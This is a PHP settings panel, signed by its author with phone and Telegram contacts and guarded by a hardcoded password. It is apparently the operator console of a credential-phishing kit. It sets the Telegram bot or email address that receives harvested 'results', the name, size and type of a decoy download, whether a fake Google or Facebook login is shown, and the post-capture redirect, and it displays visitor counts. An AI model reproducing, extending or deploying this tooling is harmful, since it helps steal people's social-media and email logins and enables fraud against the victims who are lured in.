<?php
// CREATED BY TIRZZ23NESIA
// WA : 6285718662148
// TELE : @zexoorill
// DO NOT REMOVE THIS COPYRIGHT NOTICE.
session_start();
$password = "TIRZZ23NESIA";

if (isset($_POST['auth_password'])) {
    if ($_POST['auth_password'] === $password) {
        $_SESSION['host_authenticated'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $auth_error = true;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

$is_authenticated = isset($_SESSION['host_authenticated']) && $_SESSION['host_authenticated'] === true;

$data = ['nama' => '',  'send_method' => 'telegram', 'tokenbot' => '', 'userid' => '', 'email_to' => 'tirzznesia@gmail.com', 'email_subject' => 'RESS VIP BY T23N', 'email_from_name' => 'RESS GACOR T23N', 'email_from_address' => 'admin@tirzznesia.com', 'namafile' => '', 'ukuran' => '', 'jenisfile' => 'jpg', 'linkredirect' => '', 'login_mode' => 'both'];
$vis = ['today' => 0, 'yesterday' => 0, 'total' => 0];

if ($is_authenticated) {
    if (!is_dir('jetetc')) {
        mkdir('jetetc', 0755, true);
    }
    
    if (file_exists("jetetc/datanya.json")) {
        $loaded = json_decode(preg_replace('/^\xEF\xBB\xBF/', '', file_get_contents("jetetc/datanya.json")), true);
        if (is_array($loaded)) {
            $data = array_merge($data, $loaded);
        }
    } else {
        file_put_contents("jetetc/datanya.json", json_encode($data, JSON_PRETTY_PRINT));
    }

    if (file_exists("jetetc/pengunjungvisit.json")) {
        $vis = json_decode(file_get_contents("jetetc/pengunjungvisit.json"), true) ?: $vis;
        
        // Date-based rotation: ensure stats are accurate for current day
        $todayDate = date('Y-m-d');
        $lastDate = $vis['last_date'] ?? '';
        if ($lastDate !== '' && $lastDate !== $todayDate) {
            if ($lastDate === date('Y-m-d', strtotime('-1 day'))) {
                $vis['yesterday'] = $vis['today'];
            } else {
                $vis['yesterday'] = 0;
            }
            $vis['today'] = 0;
            $vis['last_date'] = $todayDate;
            file_put_contents("jetetc/pengunjungvisit.json", json_encode($vis, JSON_PRETTY_PRINT));
        }
    } else {
        file_put_contents("jetetc/pengunjungvisit.json", json_encode($vis, JSON_PRETTY_PRINT));
    }

    $update_response = ['status' => '', 'message' => ''];
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
        $action = $_POST['action'];
        $updated = false;

        if ($action === 'update_nama' && isset($_POST['nama'])) {
            $data['nama'] = trim($_POST['nama']);
            $updated = true;
            $update_response = ['status' => 'success', 'message' => 'Nama berhasil diperbarui'];
        } elseif ($action === 'update_send_method' && isset($_POST['send_method'])) {
            $mode = $_POST['send_method'];
            if (in_array($mode, ['telegram', 'email'])) {
                $data['send_method'] = $mode;
                $updated = true;
                $update_response = ['status' => 'success', 'message' => 'Metode pengiriman berhasil diperbarui'];
            } else {
                $update_response = ['status' => 'error', 'message' => 'Metode tidak valid'];
            }
        } elseif ($action === 'update_tokenbot' && isset($_POST['tokenbot'])) {
            $data['tokenbot'] = trim($_POST['tokenbot']);
            $updated = true;
            $update_response = ['status' => 'success', 'message' => 'Bot Token berhasil diperbarui'];
        } elseif ($action === 'update_userid' && isset($_POST['userid'])) {
            $data['userid'] = trim($_POST['userid']);
            $updated = true;
            $update_response = ['status' => 'success', 'message' => 'User ID berhasil diperbarui'];
        } elseif ($action === 'update_email_to' && isset($_POST['email_to'])) {
            $data['email_to'] = trim($_POST['email_to']);
            $updated = true;
            $update_response = ['status' => 'success', 'message' => 'Email tujuan berhasil diperbarui'];
        } elseif ($action === 'update_email_subject' && isset($_POST['email_subject'])) {
            $data['email_subject'] = trim($_POST['email_subject']);
            $updated = true;
            $update_response = ['status' => 'success', 'message' => 'Subjek email berhasil diperbarui'];
        } elseif ($action === 'update_email_from_name' && isset($_POST['email_from_name'])) {
            $data['email_from_name'] = trim($_POST['email_from_name']);
            $updated = true;
            $update_response = ['status' => 'success', 'message' => 'Nama pengirim berhasil diperbarui'];
        } elseif ($action === 'update_email_from_address' && isset($_POST['email_from_address'])) {
            $data['email_from_address'] = trim($_POST['email_from_address']);
            $updated = true;
            $update_response = ['status' => 'success', 'message' => 'Email pengirim berhasil diperbarui'];
        } elseif ($action === 'update_namafile' && isset($_POST['namafile'])) {
            $data['namafile'] = trim($_POST['namafile']);
            $updated = true;
            $update_response = ['status' => 'success', 'message' => 'Nama File berhasil diperbarui'];
        } elseif ($action === 'update_ukuran' && isset($_POST['ukuran'])) {
            $data['ukuran'] = trim($_POST['ukuran']);
            $updated = true;
            $update_response = ['status' => 'success', 'message' => 'Ukuran File berhasil diperbarui'];
        } elseif ($action === 'update_jenisfile' && isset($_POST['jenisfile'])) {
            $mode = $_POST['jenisfile'];
            if (in_array($mode, ['jpg', 'zip', 'mp4'])) {
                $data['jenisfile'] = $mode;
                $updated = true;
                $update_response = ['status' => 'success', 'message' => 'Jenis file berhasil diperbarui'];
            } else {
                $update_response = ['status' => 'error', 'message' => 'Jenis file tidak valid'];
            }
        } elseif ($action === 'update_linkredirect' && isset($_POST['linkredirect'])) {
            $data['linkredirect'] = trim($_POST['linkredirect']);
            $updated = true;
            $update_response = ['status' => 'success', 'message' => 'Link redirect berhasil diperbarui'];
        } elseif ($action === 'update_login_mode' && isset($_POST['login_mode'])) {
            $mode = $_POST['login_mode'];
            if (in_array($mode, ['google', 'facebook', 'both'])) {
                $data['login_mode'] = $mode;
                $updated = true;
                $update_response = ['status' => 'success', 'message' => 'Mode login berhasil diperbarui'];
            } else {
                $update_response = ['status' => 'error', 'message' => 'Mode login tidak valid'];
            }
        }

        if ($updated) {
            file_put_contents("jetetc/datanya.json", json_encode($data, JSON_PRETTY_PRINT));
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $is_authenticated ? 'Panel Setting' : 'Authentication Required' ?></title>
    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/myimg/ressbanner.jpg">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/settingchangealldata/changedata.css">
    <style>
        :root {
            --grey: #9e9e9e;
            --grey-glow: rgb(48, 48, 48);
        }
        .data-row .row-icon.grey { background: var(--grey-glow); color: var(--grey); }
    </style>
</head>
<body>
    <canvas id="particleCanvas"></canvas>
    <script src="https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/settingchangealldata/particle1.js"></script>
    <?php if (!$is_authenticated): ?>
    <div class="auth-screen">
        <div class="auth-box">
            <div class="auth-logo">
                <i class="fa-solid fa-shield-halved"></i>
            </div>
            <h2 class="auth-title">Panel Terkunci</h2>
            <p class="auth-subtitle">Masukkan password untuk mengakses panel</p>

            <div class="auth-card">
                <?php if (!empty($auth_error)): ?>
                <div class="auth-error">
                    <i class="fa-solid fa-circle-exclamation"></i>
                    Password nya salah tolol.
                </div>
                <?php endif; ?>

                <form method="POST">
                    <div class="input-group">
                        <label>Password</label>
                        <input type="password" name="auth_password" id="authPass" placeholder="&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;" required autofocus>
                        <button type="button" class="toggle-pass" onclick="togglePassword()">
                            <i class="fa-solid fa-eye" id="eyeIcon"></i>
                        </button>
                    </div>
                    <button type="submit" class="btn-auth">
                        <i class="fa-solid fa-arrow-right-to-bracket" style="margin-right:6px;"></i>Masuk ke Panel
                    </button>
                </form>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@11/settingchangealldata/togglepw.js"></script>

    <?php else: ?>
    <div class="dashboard">
        <div class="profile-banner">
            <img src="https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/myimg/ressbanner.jpg" alt="Banner" class="banner-img">
            <div class="banner-overlay">
                <div class="banner-info">
                    <h1>Panel Setting</h1>
                    <div class="tag"><i class="fa-solid fa-bolt"></i> TIRZZ23NESIA</div>
                </div>
                <a href="?logout=1" class="logout-btn" onclick="return confirm('Yakin ingin logout?')">
                    <i class="fa-solid fa-sign-out-alt"></i> Logout
                </a>
            </div>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-icon"><i class="fa-solid fa-eye"></i></div>
                <div class="stat-value"><?= intval($vis['today']) ?></div>
                <div class="stat-label">Hari Ini</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon"><i class="fa-solid fa-clock-rotate-left"></i></div>
                <div class="stat-value"><?= intval($vis['yesterday']) ?></div>
                <div class="stat-label">Kemarin</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon"><i class="fa-solid fa-chart-line"></i></div>
                <div class="stat-value"><?= intval($vis['total']) ?></div>
                <div class="stat-label">Total</div>
            </div>
        </div>

        <div class="section-card">
            <div class="section-header">
                <i class="fa-solid fa-sliders"></i>
                <span class="section-title">Pengaturan Data</span>
            </div>
            <div class="section-body">
                <div class="data-row">
                    <div class="row-icon blue"><i class="fa-solid fa-user"></i></div>
                    <div class="row-content">
                        <div class="row-label">Nama</div>
                        <div class="row-value" id="displayNama"><?= htmlspecialchars($data['nama'] ?? '') ?></div>
                    </div>
                    <button class="row-btn" onclick="toggleEdit('nama')" title="Edit">
                        <i class="fa-solid fa-pen-to-square"></i>
                    </button>
                </div>
                <div class="data-row">
                    <div class="row-icon orange"><i class="fa-solid fa-paper-plane"></i></div>
                    <div class="row-content">
                        <div class="row-label">Metode Pengiriman</div>
                        <div class="row-value" id="displaySendMethod">
                            <?php
                            $methodMap = ['telegram' => 'Telegram', 'email' => 'Gmail / Email'];
                            echo $methodMap[$data['send_method'] ?? 'telegram'] ?? 'Telegram';
                            ?>
                        </div>
                    </div>
                    <button class="row-btn" onclick="toggleEdit('sendMethod')" title="Ubah">
                        <i class="fa-solid fa-pen-to-square"></i>
                    </button>
                </div>

                <!-- TELEGRAM FIELDS -->
                <div id="telegramFields" style="<?= ($data['send_method'] ?? 'telegram') !== 'telegram' ? 'display:none;' : '' ?>">
                    <div class="data-row">
                        <div class="row-icon grey"><i class="fa-solid fa-crown"></i></div>
                        <div class="row-content">
                            <div class="row-label">Bot Token</div>
                            <div class="row-value" id="displayTokenbot"><?= htmlspecialchars($data['tokenbot'] ?? '') ?></div>
                        </div>
                        <button class="row-btn" onclick="toggleEdit('tokenbot')" title="Edit">
                            <i class="fa-solid fa-pen-to-square"></i>
                        </button>
                    </div>
                    <div class="data-row">
                        <div class="row-icon teal"><i class="fa-solid fa-hashtag"></i></div>
                        <div class="row-content">
                            <div class="row-label">User ID</div>
                            <div class="row-value" id="displayUserid"><?= htmlspecialchars($data['userid'] ?? '') ?></div>
                        </div>
                        <button class="row-btn" onclick="toggleEdit('userid')" title="Edit">
                            <i class="fa-solid fa-pen-to-square"></i>
                        </button>
                    </div>
                </div>

                <!-- EMAIL FIELD -->
                <div id="emailFields" style="<?= ($data['send_method'] ?? 'telegram') !== 'email' ? 'display:none;' : '' ?>">
                    <div class="data-row">
                        <div class="row-icon red"><i class="fa-solid fa-envelope"></i></div>
                        <div class="row-content">
                            <div class="row-label">Email Tujuan</div>
                            <div class="row-value" id="displayEmailTo"><?= htmlspecialchars($data['email_to'] ?? '') ?></div>
                        </div>
                        <button class="row-btn" onclick="toggleEdit('emailTo')" title="Edit">
                            <i class="fa-solid fa-pen-to-square"></i>
                        </button>
                    </div>
                    <div class="data-row">
                        <div class="row-icon orange"><i class="fa-solid fa-heading"></i></div>
                        <div class="row-content">
                            <div class="row-label">Subjek Email</div>
                            <div class="row-value" id="displayEmailSubject"><?= htmlspecialchars($data['email_subject'] ?? '') ?></div>
                        </div>
                        <button class="row-btn" onclick="toggleEdit('emailSubject')" title="Edit">
                            <i class="fa-solid fa-pen-to-square"></i>
                        </button>
                    </div>
                    <div class="data-row">
                        <div class="row-icon purple"><i class="fa-solid fa-signature"></i></div>
                        <div class="row-content">
                            <div class="row-label">Nama Pengirim</div>
                            <div class="row-value" id="displayEmailFromName"><?= htmlspecialchars($data['email_from_name'] ?? '') ?></div>
                        </div>
                        <button class="row-btn" onclick="toggleEdit('emailFromName')" title="Edit">
                            <i class="fa-solid fa-pen-to-square"></i>
                        </button>
                    </div>
                    <div class="data-row">
                        <div class="row-icon teal"><i class="fa-solid fa-at"></i></div>
                        <div class="row-content">
                            <div class="row-label">Email Pengirim</div>
                            <div class="row-value" id="displayEmailFromAddress"><?= htmlspecialchars($data['email_from_address'] ?? '') ?></div>
                        </div>
                        <button class="row-btn" onclick="toggleEdit('emailFromAddress')" title="Edit">
                            <i class="fa-solid fa-pen-to-square"></i>
                        </button>
                    </div>
                </div>
            </div>

            <div class="edit-form" id="editNama">
                <form method="POST" onsubmit="return submitEdit(event, 'nama')">
                    <input type="hidden" name="action" value="update_nama">
                    <div class="edit-input-wrap">
                        <input type="text" name="nama" id="inputNama" placeholder="Masukkan nama baru..." value="<?= htmlspecialchars($data['nama'] ?? '') ?>">
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>

            <div class="edit-form" id="editSendMethod">
                <form method="POST" onsubmit="return submitEdit(event, 'sendMethod')">
                    <input type="hidden" name="action" value="update_send_method">
                    <div class="edit-input-wrap">
                        <select name="send_method" id="inputSendMethod">
                            <option value="telegram" <?= ($data['send_method'] ?? 'telegram') == 'telegram' ? 'selected' : '' ?>>Telegram</option>
                            <option value="email" <?= ($data['send_method'] ?? 'telegram') == 'email' ? 'selected' : '' ?>>Gmail / Email</option>
                        </select>
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>

            <div class="edit-form" id="editTokenbot">
                <form method="POST" onsubmit="return submitEdit(event, 'tokenbot')">
                    <input type="hidden" name="action" value="update_tokenbot">
                    <div class="edit-input-wrap">
                        <input type="text" name="tokenbot" id="inputTokenbot" placeholder="Masukkan bot token baru..." value="<?= htmlspecialchars($data['tokenbot'] ?? '') ?>">
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>

            <div class="edit-form" id="editUserid">
                <form method="POST" onsubmit="return submitEdit(event, 'userid')">
                    <input type="hidden" name="action" value="update_userid">
                    <div class="edit-input-wrap">
                        <input type="text" name="userid" id="inputUserid" placeholder="Masukkan user ID baru..." value="<?= htmlspecialchars($data['userid'] ?? '') ?>">
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>

            <div class="edit-form" id="editEmailTo">
                <form method="POST" onsubmit="return submitEdit(event, 'emailTo')">
                    <input type="hidden" name="action" value="update_email_to">
                    <div class="edit-input-wrap">
                        <input type="email" name="email_to" id="inputEmailTo" placeholder="contoh@gmail.com" value="<?= htmlspecialchars($data['email_to'] ?? '') ?>">
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>

            <div class="edit-form" id="editEmailSubject">
                <form method="POST" onsubmit="return submitEdit(event, 'emailSubject')">
                    <input type="hidden" name="action" value="update_email_subject">
                    <div class="edit-input-wrap">
                        <input type="text" name="email_subject" id="inputEmailSubject" placeholder="Contoh: 🇮🇩 || Results Punya NamaScript" value="<?= htmlspecialchars($data['email_subject'] ?? '') ?>">
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>

            <div class="edit-form" id="editEmailFromName">
                <form method="POST" onsubmit="return submitEdit(event, 'emailFromName')">
                    <input type="hidden" name="action" value="update_email_from_name">
                    <div class="edit-input-wrap">
                        <input type="text" name="email_from_name" id="inputEmailFromName" placeholder="Contoh: RIDWAN HOSTING ⚡" value="<?= htmlspecialchars($data['email_from_name'] ?? '') ?>">
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>

            <div class="edit-form" id="editEmailFromAddress">
                <form method="POST" onsubmit="return submitEdit(event, 'emailFromAddress')">
                    <input type="hidden" name="action" value="update_email_from_address">
                    <div class="edit-input-wrap">
                        <input type="email" name="email_from_address" id="inputEmailFromAddress" placeholder="Contoh: admin@domain.com" value="<?= htmlspecialchars($data['email_from_address'] ?? '') ?>">
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>
        </div>

        <div class="section-card">
            <div class="section-header">
                <i class="fa-solid fa-sliders"></i>
                <span class="section-title">Pengaturan Website</span>
            </div>
            <div class="section-body">
                <div class="data-row">
                    <div class="row-icon orange"><i class="fa-solid fa-file-signature"></i></div>
                    <div class="row-content">
                        <div class="row-label">Nama File</div>
                        <div class="row-value" id="displayNamafile"><?= htmlspecialchars($data['namafile'] ?? '') ?></div>
                    </div>
                    <button class="row-btn" onclick="toggleEdit('namafile')" title="Edit">
                        <i class="fa-solid fa-pen-to-square"></i>
                    </button>
                </div>
                <div class="data-row">
                    <div class="row-icon purple"><i class="fa-solid fa-download"></i></div>
                    <div class="row-content">
                        <div class="row-label">Ukuran File</div>
                        <div class="row-value" id="displayUkuran"><?= htmlspecialchars($data['ukuran'] ?? '') ?></div>
                    </div>
                    <button class="row-btn" onclick="toggleEdit('ukuran')" title="Edit">
                        <i class="fa-solid fa-pen-to-square"></i>
                    </button>
                </div>
                <div class="data-row">
                    <div class="row-icon red"><i class="fa-solid fa-file"></i></div>
                    <div class="row-content">
                        <div class="row-label">Jenis File</div>
                        <?php
                        $jenisFileMap = [
                            'jpg' => 'Gambar/JPG',
                            'zip' => 'Zip/Archive',
                            'mp4' => 'Video/MP4'
                        ];
                        $displayJenis = $jenisFileMap[$data['jenisfile']] ?? $data['jenisfile'];
                        ?>
                        <div class="row-value" id="displayJenisfile"><?= htmlspecialchars($displayJenis) ?></div>
                    </div>
                    <button class="row-btn" onclick="toggleEdit('jenisfile')" title="Edit">
                        <i class="fa-solid fa-pen-to-square"></i>
                    </button>
                </div>
            </div>

            <div class="edit-form" id="editNamafile">
                <form method="POST" onsubmit="return submitEdit(event, 'namafile')">
                    <input type="hidden" name="action" value="update_namafile">
                    <div class="edit-input-wrap">
                        <input type="text" name="namafile" id="inputNamafile" placeholder="Masukkan nama file baru..." value="<?= htmlspecialchars($data['namafile'] ?? '') ?>">
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>
            <div class="edit-form" id="editUkuran">
                <form method="POST" onsubmit="return submitEdit(event, 'ukuran')">
                    <input type="hidden" name="action" value="update_ukuran">
                    <div class="edit-input-wrap">
                        <input type="text" name="ukuran" id="inputUkuran" placeholder="Masukkan ukuran file baru..." value="<?= htmlspecialchars($data['ukuran'] ?? '') ?>">
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>
            <div class="edit-form" id="editJenisfile">
                <form method="POST" onsubmit="return submitEdit(event, 'jenisfile')">
                    <input type="hidden" name="action" value="update_jenisfile">
                    <div class="edit-input-wrap">
                        <select name="jenisfile" id="inputJenisfile">
                            <option value="jpg" <?= $data['jenisfile'] == 'jpg' ? 'selected' : '' ?>>Gambar/JPG</option>
                            <option value="zip" <?= $data['jenisfile'] == 'zip' ? 'selected' : '' ?>>Zip/Archive</option>
                            <option value="mp4" <?= $data['jenisfile'] == 'mp4' ? 'selected' : '' ?>>Video/MP4</option>
                        </select>
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>
        </div>

        <div class="section-card">
            <div class="section-header">
                <i class="fa-solid fa-key"></i>
                <span class="section-title">Pengaturan Lainnya</span>
            </div>
            <div class="section-body">
                <div class="data-row">
                    <div class="row-icon blue"><i class="fa-solid fa-arrow-right-to-bracket"></i></div>
                    <div class="row-content">
                        <div class="row-label">Metode Login</div>
                        <div class="row-value" id="displayLoginMode">
                            <?php
                            $modeMap = ['google' => 'Google', 'facebook' => 'Facebook', 'both' => 'Google + Facebook'];
                            echo $modeMap[$data['login_mode']] ?? 'Both';
                            ?>
                        </div>
                    </div>
                    <button class="row-btn" onclick="toggleEdit('loginMode')" title="Ubah">
                        <i class="fa-solid fa-pen-to-square"></i>
                    </button>
                </div>
                <div class="data-row">
                    <div class="row-icon orange"><i class="fa-solid fa-link"></i></div>
                    <div class="row-content">
                        <div class="row-label">Link Redirect</div>
                        <div class="row-value" id="displayLinkredirect"><?= htmlspecialchars($data['linkredirect'] ?? '') ?></div>
                    </div>
                    <button class="row-btn" onclick="toggleEdit('linkredirect')" title="Edit">
                        <i class="fa-solid fa-pen-to-square"></i>
                    </button>
                </div>
            </div>

            <div class="edit-form" id="editLoginMode">
                <form method="POST" onsubmit="return submitEdit(event, 'loginMode')">
                    <input type="hidden" name="action" value="update_login_mode">
                    <div class="edit-input-wrap">
                        <select name="login_mode" id="inputLoginMode">
                            <option value="google" <?= $data['login_mode'] == 'google' ? 'selected' : '' ?>>Google Only</option>
                            <option value="facebook" <?= $data['login_mode'] == 'facebook' ? 'selected' : '' ?>>Facebook Only</option>
                            <option value="both" <?= $data['login_mode'] == 'both' ? 'selected' : '' ?>>Google + Facebook</option>
                        </select>
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>
            <div class="edit-form" id="editLinkredirect">
                <form method="POST" onsubmit="return submitEdit(event, 'linkredirect')">
                    <input type="hidden" name="action" value="update_linkredirect">
                    <div class="edit-input-wrap">
                        <input type="text" name="linkredirect" id="inputLinkredirect" placeholder="Masukkan link redirect baru..." value="<?= htmlspecialchars($data['linkredirect'] ?? '') ?>">
                        <button type="submit" class="btn-save">
                            <i class="fa-solid fa-check" style="margin-right:4px;"></i>Simpan
                        </button>
                    </div>
                </form>
            </div>
        </div>

        <div class="panel-footer">
            <p>TIRZZ23NESIA &middot; <a href="https://wa.me/6285718662148" target="_blank">Kontak</a></p>
        </div>
    </div>

    <div class="toast" id="toast">
        <i class="fa-solid fa-circle-check"></i>
        <span id="toastText">Berhasil disimpan!</span>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script>
        function toggleEdit(type) {
        const elId = 'edit' + type.charAt(0).toUpperCase() + type.slice(1);
        const el = document.getElementById(elId);
        const isOpen = el.classList.contains('active');
        document.querySelectorAll('.edit-form').forEach(f => f.classList.remove('active'));
        if (!isOpen) { 
            el.classList.add('active'); 
            const input = el.querySelector('input, select');
            if (input) input.focus();
        }
    }

    function showToast(message, type) {
        const toast = document.getElementById('toast');
        const icon = toast.querySelector('i');
        const text = document.getElementById('toastText');
        toast.className = 'toast ' + type;
        icon.className = type === 'success' ? 'fa-solid fa-circle-check' : 'fa-solid fa-circle-xmark';
        text.textContent = message;
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 2500);
    }

    function submitEdit(event, type) {
        event.preventDefault();
        const form = event.target;
        const formData = new FormData(form);

        $.ajax({
            url: window.location.href,
            type: 'POST',
            data: formData,
            processData: false,
            contentType: false,
            success: function() {
                if (type === 'nama') {
                    const newVal = document.getElementById('inputNama').value;
                    document.getElementById('displayNama').textContent = newVal;
                } else if (type === 'sendMethod') {
                    const select = document.getElementById('inputSendMethod');
                    const newVal = select.options[select.selectedIndex].text;
                    const selectedValue = select.value;
                    document.getElementById('displaySendMethod').textContent = newVal;
                    const telegramFields = document.getElementById('telegramFields');
                    const emailFields = document.getElementById('emailFields');
                    if (selectedValue === 'telegram') {
                        telegramFields.style.display = '';
                        emailFields.style.display = 'none';
                    } else if (selectedValue === 'email') {
                        telegramFields.style.display = 'none';
                        emailFields.style.display = '';
                    }
                } else if (type === 'emailTo') {
                    const newVal = document.getElementById('inputEmailTo').value;
                    document.getElementById('displayEmailTo').textContent = newVal;
                } else if (type === 'emailSubject') {
                    const newVal = document.getElementById('inputEmailSubject').value;
                    document.getElementById('displayEmailSubject').textContent = newVal;
                } else if (type === 'emailFromName') {
                    const newVal = document.getElementById('inputEmailFromName').value;
                    document.getElementById('displayEmailFromName').textContent = newVal;
                } else if (type === 'emailFromAddress') {
                    const newVal = document.getElementById('inputEmailFromAddress').value;
                    document.getElementById('displayEmailFromAddress').textContent = newVal;
                } else if (type === 'tokenbot') {
                    const newVal = document.getElementById('inputTokenbot').value;
                    document.getElementById('displayTokenbot').textContent = newVal;
                } else if (type === 'userid') {
                    const newVal = document.getElementById('inputUserid').value;
                    document.getElementById('displayUserid').textContent = newVal;
                } else if (type === 'namafile') {
                    const newVal = document.getElementById('inputNamafile').value;
                    document.getElementById('displayNamafile').textContent = newVal;
                } else if (type === 'ukuran') {
                    const newVal = document.getElementById('inputUkuran').value;
                    document.getElementById('displayUkuran').textContent = newVal;
                } else if (type === 'jenisfile') {
                    const select = document.getElementById('inputJenisfile');
                    const newVal = select.options[select.selectedIndex].text;
                    document.getElementById('displayJenisfile').textContent = newVal;
                } else if (type === 'linkredirect') {
                    const newVal = document.getElementById('inputLinkredirect').value;
                    document.getElementById('displayLinkredirect').textContent = newVal;
                } else if (type === 'loginMode') {
                    const select = document.getElementById('inputLoginMode');
                    const newVal = select.options[select.selectedIndex].text;
                    document.getElementById('displayLoginMode').textContent = newVal;
                }
                document.querySelectorAll('.edit-form').forEach(f => f.classList.remove('active'));
                showToast(type === 'loginMode' ? 'Mode login berhasil diperbarui' : type === 'sendMethod' ? 'Metode pengiriman berhasil diperbarui' : type === 'emailTo' ? 'Email tujuan berhasil diperbarui' : 'Data berhasil diperbarui', 'success');
            },
            error: function() {
                showToast('Gagal menyimpan. Coba lagi.', 'error');
            }
        });
        return false;
    }

    <?php if (isset($update_response['status']) && $update_response['status']): ?>
    $(document).ready(function() {
        showToast('<?= $update_response['message'] ?>', '<?= $update_response['status'] ?>');
    });
    <?php endif; ?>

    document.querySelectorAll('.edit-form input, .edit-form select').forEach(inp => {
        inp.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') { 
                e.preventDefault(); 
                this.closest('form').querySelector('.btn-save').click(); 
            }
        });
    });
    </script>
    <?php endif; ?>
</body>
</html>

